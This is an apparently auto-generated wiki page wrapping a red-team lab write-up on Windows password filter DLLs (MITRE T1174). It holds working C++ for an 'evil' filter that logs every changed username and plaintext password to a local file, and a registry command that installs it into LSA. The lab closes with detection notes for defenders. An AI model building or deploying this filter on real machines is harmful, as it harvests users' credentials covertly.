---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Password Filter

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-t1174-password-filter-dll` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/t1174-password-filter-dll.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password Filter](../../topics/offensive-security/password-filter.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-t1174-password-filter-dll |
| name | Password Filter |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/t1174-password-filter-dll.md |

## Preserved Source Material

````yaml
_asset_filenames:
- password-filter-cmdline.png
- password-filter-createdtime.png
- password-filter-filter-working.png
- password-filter-log1.png
- password-filter-regedit.png
- password-filter-updating-registry.png
- password-filter.png
_body: "---\ndescription: Credential Access\n---\n\n# Password Filter\n\nThis lab explores a native OS notification of when\
  \ the user account password gets changed, which is responsible for validating it. That, of course means, that the password\
  \ can be intercepted and logged.\n\n## Execution\n\nPassword filters are registered in registry and we can see them here:\n\
  \n{% code title=\"attacker@victim\" %}\n```csharp\nreg query \"hklm\\system\\currentcontrolset\\control\\lsa\" /v \"notification\
  \ packages\"\n```\n{% endcode %}\n\nOr via regedit:\n\n![](../../.gitbook/assets/password-filter-regedit.png)\n\nBuilding\
  \ an evil filter DLL based on a great [article](http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html)\
  \ by mubix. He has also kindly provided the code to use, which I modified slightly to make sure that the critical DLL functions\
  \ were exported correctly in order for this technique to work, since mubix's code did not work for me out of the box. I\
  \ also had to change the logging statements in order to rectify a couple of compiler issues:\n\n```cpp\n#include \"stdafx.h\"\
  \n#include <windows.h>\n#include <stdio.h>\n#include <WinInet.h>\n#include <ntsecapi.h>\n#include <stdio.h>\n#include <iostream>\n\
  #include <fstream>\nusing namespace std;\n\nvoid writeToLog(const char* szString)\n{\n\tFILE *pFile;\n\tfopen_s(&pFile,\
  \ \"c:\\\\logFile.txt\", \"a+\");\n\n\tif (NULL == pFile)\n\t{\n\t\treturn;\n\t}\n\tfprintf(pFile, \"%s\\r\\n\", szString);\n\
  \tfclose(pFile);\n\treturn;\n\n}\n\nextern \"C\" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void)\n\
  {\n\tOutputDebugString(L\"InitializeChangeNotify\");\n\twriteToLog(\"InitializeChangeNotify()\");\n\treturn TRUE;\n}\n\n\
  extern \"C\" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(\n\tPUNICODE_STRING AccountName,\n\tPUNICODE_STRING\
  \ FullName,\n\tPUNICODE_STRING Password,\n\tBOOLEAN SetOperation)\n{\n\tOutputDebugString(L\"PasswordFilter\");\n\treturn\
  \ TRUE;\n}\n\nextern \"C\" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(\n\tPUNICODE_STRING UserName,\n\
  \tULONG RelativeId,\n\tPUNICODE_STRING NewPassword)\n{\n\tFILE *pFile;\n\tfopen_s(&pFile, \"c:\\\\logFile.txt\", \"a+\"\
  );\n\n\tOutputDebugString(L\"PasswordChangeNotify\");\n\tif (NULL == pFile)\n\t{\n\t\treturn true;\n\t}\n\tfprintf(pFile,\
  \ \"%ws:%ws\\r\\n\", UserName->Buffer, NewPassword->Buffer);\n\tfclose(pFile);\n\treturn 0;\n}\n```\n\n{% file src=\"../../.gitbook/assets/evilpwfilter.dll\"\
  \ caption=\"Password Filter DLL\" %}\n\nInjecting the evil password filter into the victim system:\n\n{% code title=\"attacker@victim\"\
  \ %}\n```csharp\nreg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v \"notification packages\" /d scecli\\0evilpwfilter\
  \ /t reg_multi_sz\n\nValue notification packages exists, overwrite(Yes/No)? yes\nThe operation completed successfully.\n\
  ```\n{% endcode %}\n\n![](../../.gitbook/assets/password-filter-updating-registry.png)\n\nTesting password changes after\
  \ the reboot - note how the password changes are getting logged:\n\n![](../../.gitbook/assets/password-filter-filter-working.png)\n\
  \n## Observations\n\nWindows event `4614` notifies about new packages loaded by the SAM:\n\n![](../../.gitbook/assets/password-filter-log1.png)\n\
  \nLogging command line can also help in detecting this activity:\n\n![](../../.gitbook/assets/password-filter-cmdline.png)\n\
  \n...especially, if the package has just been recently dropped to disk:\n\n![](../../.gitbook/assets/password-filter-createdtime.png)\n\
  \nAlso, it may be worth considering checking new DLLs dropped to `%systemroot%\\system32` for exported `PasswordChangeNotify`function:\n\
  \n![](../../.gitbook/assets/password-filter.png)\n\n## References\n\n{% embed url=\"http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html\"\
  \ %}\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1174\" %}"
_relative_path: offensive-security/credential-access-and-credential-dumping/t1174-password-filter-dll.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/t1174-password-filter-dll.md
````
